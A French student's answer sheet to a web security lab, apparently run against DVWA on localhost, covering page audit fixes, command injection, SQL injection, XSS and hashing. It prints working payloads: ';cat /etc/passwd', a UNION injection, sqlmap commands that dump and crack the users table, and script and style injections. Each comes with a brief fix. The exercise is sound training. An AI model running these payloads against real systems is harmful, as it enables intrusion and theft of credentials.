
## Question 1 .

- Les ressources chargées bloquent le chargement de la page. Pour éviter ce phénomène il faudrait appeler en différé ou en asyncrhone les ressources CSS et JS de la page. avec async et defer

- Le background et le foreground n'ont pas de contraste assez  différent et gêne à la lecture de la page. Il faudrait changer la couleur du background pour une couleur plus foncée par exemple.

- La balise <html> n'a pas d'attribut langue. Il faudrait rajouter l'attribut lang="fr"

- Il faut remplacer les call HTTP/1.1 des ressources CSS et JS par des call HTTP/2. Pour changer de 1.1 à 2, voici la doc https://developers.google.com/web/tools/lighthouse/audits/http2

- Les appels de ressources externes ne sont pas sécurisées. Il faut rajouter dans les balises <a> l'attribut 'rel="noopener"' ou 'rel="noreferrer"'

- Le doctype de la page est manquant. Il faut rajouter "<!DOCTYPE html>" au début du document HTML.

- Le site ne contient pas de balise <meta name="viewport"> avec la largeur ou le l'échelle initiale. Il faut ajouter cette balise pour optimiser le site pour les appareils mobiles.

- Il faut que la police soit plus grande que 12px

## Question 2


Le fichier le plus sensible trouvé est le fichier config/config.inc.php(.bak|dist)
Il comporte les informations de connexion à la BDD
Cette attaque a pour but de récupérer des données utilisateurs pour les réutiliser sur d'autres sites pour récupérer toujours plus d'infos !!
Il faut configurer le serveur pour rendre inaccessible les dossiers sensibles.

## Question 3

`;cat /etc/passwd`
`; fuser -u 80/tcp`

Pour eviter cela, il faut escape ";" et tout les operateur système "|", "&&" etc ..

Bonus: Expliquer la différence entre un “bind shell” et un “reverse shell”. Pourquoi est-il plus
efficace d’utiliser un reverse shell ?
;

## Question 4


## Question 5

`?id=a' UNION SELECT "t_name","t_schema" FROM information_schemas.tables;-- -&Submit=Submit.`
Il est possible de récuperer/modifier/supprimer toutes les information existante sur la db.
Il faut escape tout les opérateurs SQL et tester la nature du résultat.


## Question 6
L'injection SQL aveugle est presque identique à l'injection SQL normale, la seule différence étant la façon dont les données sont extraites de la base de données. Lorsque la base de données ne fournit pas de données à la page Web, un attaquant est forcé de voler des données en posant à la base de données une série de questions vraies ou fausses. Cela rend l'exploitation de la vulnérabilité d'injection SQL plus difficile, mais pas impossible. .

On essaie d'attaquer la base avec la connection effectuée avec le navigateur

`sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" --cookie="Cookie: security_level=0; PHPSESSID=ef3l52t54j9vv58hfiipk9oui7; security=low" -u 'http://localhost/vulnerabilities/sqli/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id`

On a réussi et maintenant on cherche les bases de données existantes

`sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" --cookie="Cookie: security_level=0; PHPSESSID=ef3l52t54j9vv58hfiipk9oui7; security=low" -u 'http://localhost/vulnerabilities/sqli/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id --dbs`

On cible une base de donnée et on liste ses tables

`sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" --cookie="Cookie: security_level=0; PHPSESSID=ef3l52t54j9vv58hfiipk9oui7; security=low" -u 'http://localhost/vulnerabilities/sqli/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id -D dvwa --tables`

Et maintenant on dump la table users et merci sqlmap , il nous unHash les mots de passes   

`sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" --cookie="Cookie: security_level=0; PHPSESSID=ef3l52t54j9vv58hfiipk9oui7; security=low" -u 'http://localhost/vulnerabilities/sqli/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id -D dvwa -T users --dump`


L'injection SQL aveugle est presque identique à l'injection SQL normale, la seule différence étant la façon dont les données sont extraites de la base de données. Lorsque la base de données ne fournit pas de données à la page Web, un attaquant est forcé de voler des données en posant à la base de données une série de questions vraies ou fausses. Cela rend l'exploitation de la vulnérabilité d'injection SQL plus difficile, mais pas impossible. .

## Question 7
`<style> body{background:red !important;}</style>
<script> alert('coucou') </script>`
Il faut escape les caractère spéciaux.


## Question 8
On ajoute ceci dans le message :
`<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">`

C'est plus impactant car c'est stocké en base de donnée et donc n'importe quelle prochain utilisateur va donc charger les scripts importés.

## Question 9
C'est l'aeroport de Denver.
https://fr.wikipedia.org/wiki/A%C3%A9roport_international_de_Denver

## Question 10
Chiffer -> reversible
Hasher -> irreversible
Le salt sert à rendre plus difficile le reverse
